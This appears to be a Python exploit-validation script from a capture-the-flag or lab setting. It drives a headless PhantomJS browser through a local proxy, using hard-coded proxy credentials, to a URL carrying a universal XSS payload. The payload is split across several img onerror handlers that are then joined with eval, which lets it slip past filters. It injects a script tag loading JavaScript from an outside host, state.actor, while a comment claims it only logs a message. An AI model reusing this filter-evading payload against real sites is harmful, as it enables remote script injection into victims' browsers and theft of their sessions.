#!/usr/bin/env python3

# Run a browser locally behind the proxy to browse to the final payload URL

import os
import sys
from selenium import webdriver
from selenium.common.exceptions import TimeoutException, NoSuchElementException, UnexpectedAlertPresentException
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from base64 import b64encode
from base64 import b64encode

# Browse to exploit URL via proxy to validate that UXSS proxy bug is working
# This payload will console.log("XSS works")
# Note backslashes are double escaped for python
url ="""
http://172.17.0.2:5000/ooops/d35fs23hu73ds/blocked.html?
<img src=a onerror=a='z=document.createElement'>_______
<img src=a onerror=b='(\\'script\\');z.src=\\'//state'>___
<img src=a onerror=c='.actor/log.js\\';document.body'>__
<img src=a onerror=d='.appendChild(z);'>_________________
<img src=aa onerror=eval(a+b+c+d)>_______________________
""".replace("\n", "")

def get_driver(proxy_host, proxy_port):
    service_args = [ '--proxy={}:{}'.format(proxy_host, proxy_port), '--proxy-type=http']

    # Proxy creds/authtoken as a capability
    proxy_creds = b"OnlyOne:Overflow"
    proxy_auth_token = "Basic " + b64encode(proxy_creds).decode("utf-8")
    caps = DesiredCapabilities.PHANTOMJS
    caps['phantomjs.page.customHeaders.Proxy-Authorization'] = proxy_auth_token

    driver = webdriver.PhantomJS('/usr/bin/phantomjs',
            service_args=service_args, desired_capabilities=caps)

    return driver

driver = get_driver("localhost", 8080)

try:
    driver.get(url)
    driver.implicitly_wait(4)

    """
    print("console logs:")
    for log in driver.get_log("browser"):
        print(log['message'])
    """

    driver.find_element_by_id("xss")
    print("Success. UXSS ran")

    sys.exit(0)


except NoSuchElementException:
    print("Failure. xss element missing- UXSS didn't run?")
    print(driver.page_source)

    sys.exit(1)
except Exception as e:
    print("General failure")
    raise e
finally:
    driver.quit()

# Won't get here on successes
sys.exit(1)
